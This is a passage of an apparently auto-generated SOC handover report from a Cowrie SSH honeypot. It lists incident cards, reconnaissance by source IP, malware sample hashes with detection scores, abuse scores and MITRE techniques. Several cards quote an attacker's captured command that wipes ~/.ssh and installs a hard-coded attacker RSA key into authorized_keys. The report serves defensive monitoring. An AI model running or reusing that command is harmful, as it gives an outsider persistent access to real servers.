| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:50:01` | `cowrie.session.connect` |
| `2026-06-04 09:50:01` | `cowrie.client.version` |
| `2026-06-04 09:50:01` | `cowrie.client.kex` |
| `2026-06-04 09:50:01` | `cowrie.login.success` |
| `2026-06-04 09:50:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-018f703fc058

| Field | Detail |
|---|---|
| **Source IP** | `103.90.227[.]203` |
| **First Seen** | 2026-06-04 09:50 |
| **Last Seen** | 2026-06-04 09:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:50:07` | `cowrie.session.connect` |
| `2026-06-04 09:50:07` | `cowrie.client.version` |
| `2026-06-04 09:50:07` | `cowrie.client.kex` |
| `2026-06-04 09:50:08` | `cowrie.login.success` |
| `2026-06-04 09:50:08` | `cowrie.session.params` |
| `2026-06-04 09:50:08` | `cowrie.command.input` |
| `2026-06-04 09:50:08` | `cowrie.command.failed` |
| `2026-06-04 09:50:08` | `cowrie.log.closed` |
| `2026-06-04 09:50:08` | `cowrie.session.params` |
| `2026-06-04 09:50:08` | `cowrie.command.input` |
| `2026-06-04 09:50:08` | `cowrie.session.file_download` |
| `2026-06-04 09:50:08` | `cowrie.log.closed` |
| `2026-06-04 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.90.227[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.90.227[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c7deed84fb2

| Field | Detail |
|---|---|
| **Source IP** | `103.90.227[.]203` |
| **First Seen** | 2026-06-04 09:50 |
| **Last Seen** | 2026-06-04 09:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:50:10` | `cowrie.session.connect` |
| `2026-06-04 09:50:10` | `cowrie.client.version` |
| `2026-06-04 09:50:10` | `cowrie.client.kex` |
| `2026-06-04 09:50:10` | `cowrie.login.success` |
| `2026-06-04 09:50:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.90.227[.]203` to AbuseIPDB if not already reported
- [ ] Block `103.90.227[.]203` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e067f2e99f8

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:52 |
| **Last Seen** | 2026-06-04 09:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:52:11` | `cowrie.session.connect` |
| `2026-06-04 09:52:11` | `cowrie.client.version` |
| `2026-06-04 09:52:11` | `cowrie.client.kex` |
| `2026-06-04 09:52:11` | `cowrie.login.success` |
| `2026-06-04 09:52:12` | `cowrie.session.params` |
| `2026-06-04 09:52:12` | `cowrie.command.input` |
| `2026-06-04 09:52:12` | `cowrie.command.failed` |
| `2026-06-04 09:52:12` | `cowrie.log.closed` |
| `2026-06-04 09:52:12` | `cowrie.session.params` |
| `2026-06-04 09:52:12` | `cowrie.command.input` |
| `2026-06-04 09:52:12` | `cowrie.session.file_download` |
| `2026-06-04 09:52:12` | `cowrie.log.closed` |
| `2026-06-04 09:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7a0fcb40900

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 09:52 |
| **Last Seen** | 2026-06-04 09:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:52:14` | `cowrie.session.connect` |
| `2026-06-04 09:52:14` | `cowrie.client.version` |
| `2026-06-04 09:52:14` | `cowrie.client.kex` |
| `2026-06-04 09:52:14` | `cowrie.login.success` |
| `2026-06-04 09:52:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b66cceab8e61

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-06-04 09:54 |
| **Last Seen** | 2026-06-04 09:54 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:54:06` | `cowrie.session.connect` |
| `2026-06-04 09:54:06` | `cowrie.client.version` |
| `2026-06-04 09:54:06` | `cowrie.client.kex` |
| `2026-06-04 09:54:07` | `cowrie.login.success` |
| `2026-06-04 09:54:08` | `cowrie.session.params` |
| `2026-06-04 09:54:08` | `cowrie.command.input` |
| `2026-06-04 09:54:08` | `cowrie.command.failed` |
| `2026-06-04 09:54:08` | `cowrie.log.closed` |
| `2026-06-04 09:54:09` | `cowrie.session.params` |
| `2026-06-04 09:54:09` | `cowrie.command.input` |
| `2026-06-04 09:54:09` | `cowrie.session.file_download` |
| `2026-06-04 09:54:09` | `cowrie.log.closed` |
| `2026-06-04 09:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe3efd8da703

| Field | Detail |
|---|---|
| **Source IP** | `20.127.185[.]37` |
| **First Seen** | 2026-06-04 09:54 |
| **Last Seen** | 2026-06-04 09:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 09:54:12` | `cowrie.session.connect` |
| `2026-06-04 09:54:12` | `cowrie.client.version` |
| `2026-06-04 09:54:12` | `cowrie.client.kex` |
| `2026-06-04 09:54:13` | `cowrie.login.success` |
| `2026-06-04 09:54:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.127.185[.]37` to AbuseIPDB if not already reported
- [ ] Block `20.127.185[.]37` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `45.66.156[.]214` | **59** | 2026-06-04 04:23 | 2026-06-04 09:59 | 43m | 0 | `T1592` | 🟠 MEDIUM |
| `101.227.203[.]162` | **32** | 2026-06-04 07:52 | 2026-06-04 08:28 | 52m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `114.242.24[.]31` | **31** | 2026-06-04 08:53 | 2026-06-04 09:27 | 59m | 0 | `T1592` | 🟠 MEDIUM |
| `1.238.106[.]229` | **30** | 2026-06-04 06:49 | 2026-06-04 07:46 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `211.228.218[.]47` | **30** | 2026-06-04 06:45 | 2026-06-04 07:49 | 0m | 30 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `115.135.233[.]75` | **29** | 2026-06-04 07:17 | 2026-06-04 08:29 | 0m | 29 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `202.152.201[.]166` | **26** | 2026-06-04 06:40 | 2026-06-04 06:53 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `152.32.205[.]153` | **25** | 2026-06-04 04:21 | 2026-06-04 05:03 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `70.120.203[.]193` | **20** | 2026-06-04 06:45 | 2026-06-04 07:25 | 0m | 20 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `2.27.20[.]28` | **16** | 2026-06-04 08:50 | 2026-06-04 09:23 | 0m | 16 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.82.45[.]61` | **13** | 2026-06-04 06:44 | 2026-06-04 08:24 | 0m | 12 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `122.175.36[.]92` | **9** | 2026-06-04 05:18 | 2026-06-04 05:40 | 0m | 9 | `T1110.001 · T1592` | 🟢 LOW |
| `157.20.254[.]47` | **8** | 2026-06-04 08:16 | 2026-06-04 08:57 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `98.71.8[.]129` | **8** | 2026-06-04 06:44 | 2026-06-04 08:34 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `150.5.131[.]119` | **5** | 2026-06-04 09:18 | 2026-06-04 09:36 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `45.119.84[.]196` | **4** | 2026-06-04 08:54 | 2026-06-04 09:09 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `72.18.83[.]212` | **4** | 2026-06-04 08:44 | 2026-06-04 08:53 | 0m | 4 | `T1110.001 · T1592` | 🟢 LOW |
| `8.209.96[.]38` | **4** | 2026-06-04 07:02 | 2026-06-04 07:03 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `46.23.108[.]238` | **3** | 2026-06-04 04:55 | 2026-06-04 04:55 | 1m | 0 | `T1592` | 🟢 LOW |
| `144.48.8[.]10` | **2** | 2026-06-04 07:07 | 2026-06-04 08:13 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.139[.]214` | **2** | 2026-06-04 08:54 | 2026-06-04 08:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.221.68[.]74` | **2** | 2026-06-04 07:16 | 2026-06-04 07:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `58.209.82[.]184` | **2** | 2026-06-04 08:54 | 2026-06-04 08:56 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `66.132.186[.]193` | **2** | 2026-06-04 06:35 | 2026-06-04 06:36 | 0m | 0 | `T1592` | 🟢 LOW |
| `72.253.251[.]7` | **2** | 2026-06-04 04:23 | 2026-06-04 04:25 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `87.236.176[.]132` | **2** | 2026-06-04 05:54 | 2026-06-04 05:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.75.182[.]178` | 1 | 2026-06-04 09:30 | 2026-06-04 09:30 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.90.227[.]203` | 1 | 2026-06-04 09:50 | 2026-06-04 09:50 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `104.248.206[.]108` | 1 | 2026-06-04 07:24 | 2026-06-04 07:24 | 0s | 0 | `T1592` | 🟢 LOW |
| `107.150.105[.]153` | 1 | 2026-06-04 06:30 | 2026-06-04 06:30 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `112.132.249[.]164` | 1 | 2026-06-04 06:41 | 2026-06-04 06:42 | 98s | 0 | `T1592` | 🟢 LOW |
| `117.34.125[.]173` | 1 | 2026-06-04 08:53 | 2026-06-04 08:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `179.102.26[.]14` | 1 | 2026-06-04 09:51 | 2026-06-04 09:51 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.36.84[.]162` | 1 | 2026-06-04 06:45 | 2026-06-04 06:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `197.140.18[.]248` | 1 | 2026-06-04 08:00 | 2026-06-04 08:00 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.127.185[.]37` | 1 | 2026-06-04 09:54 | 2026-06-04 09:54 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `209.99.190[.]113` | 1 | 2026-06-04 08:56 | 2026-06-04 08:56 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `211.25.241[.]153` | 1 | 2026-06-04 07:42 | 2026-06-04 07:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.205.123[.]19` | 1 | 2026-06-04 04:58 | 2026-06-04 05:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.156.3[.]21` | 1 | 2026-06-04 07:50 | 2026-06-04 07:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]6` | 1 | 2026-06-04 09:49 | 2026-06-04 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.253.45[.]10` | 1 | 2026-06-04 06:49 | 2026-06-04 06:49 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `47.144.113[.]111` | 1 | 2026-06-04 08:00 | 2026-06-04 08:00 | 13s | 0 | `T1592` | 🟢 LOW |
| `5.75.225[.]42` | 1 | 2026-06-04 06:46 | 2026-06-04 06:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `57.151.128[.]246` | 1 | 2026-06-04 10:00 | 2026-06-04 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.176.247[.]218` | 1 | 2026-06-04 07:54 | 2026-06-04 07:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `67.52.95[.]38` | 1 | 2026-06-04 06:25 | 2026-06-04 06:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (32 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0d3d2e513043f33923c8538f0d40b246730eb64d685628c28b89b04b6efcabf3` | ELF Binary (Linux executable) (x86-64 64-bit) | `0d3d2e513043f339...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `235596e7fb00cc04e95c500b5d02891e4b5d5ee54d063553a62c93b6bbd3eb9a` | ELF Binary (Linux executable) (ARM 32-bit) | `235596e7fb00cc04...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `321bfd80417496f99f32183c73d0a46b42900a8ae9d87b4079740b9297bc3cb4` | ELF Binary (Linux executable) (ARM 32-bit) | `321bfd80417496f9...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `99ac78541bb555b05a2c82d6c191d62e639b9fefd26ddee1f813b79cc6baf4f0` | ELF Binary (Linux executable) (MIPS 32-bit) | `99ac78541bb555b0...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `115.135.233[.]75` | MY | TMNST | **100** ⚠️ | 3 |
| `27.156.3[.]21` | CN | Broadband network the city | **100** ⚠️ | 10 |
| `193.36.84[.]162` | DE | Deployish Limited | **100** ⚠️ | 10 |
| `47.144.113[.]111` | US | Frontier Communications of America, Inc. | **100** ⚠️ | 1 |
| `220.205.123[.]19` | CN | China Unicom | **100** ⚠️ | 16 |
| `209.99.190[.]113` | CH | SKN Subnet & Telecom Ltd | **100** ⚠️ | 24 |
| `72.253.251[.]7` | US | HAWAIIAN TELCOM | **100** ⚠️ | 50 |
| `114.242.24[.]31` | CN | China Unicom Beijing province network | **100** ⚠️ | 50 |
| `179.102.26[.]14` | BR | TELEFÔNICA BRASIL S.A | **100** ⚠️ | 17 |
| `211.228.218[.]47` | KR | Korea Telecom | **100** ⚠️ | 48 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 466 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 258 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 164 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 86 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 86 |

---

## 🔕 False Positive Summary (24 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 19 below threshold 25 | 2 |
| AbuseIPDB score 23 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 17 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 579 cases |
| Tool 34  | Credential Extractor        | ✅ 423 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 6 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 59 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 24 filtered (4.2%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 49 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 32 files |
| Tool 33  | YARA Classifier             | ✅ 10 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 164 priority case(s) shown individually · 47 recon entry/entries in table (26 group(s) consolidating 370 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-04T10:01:57Z_
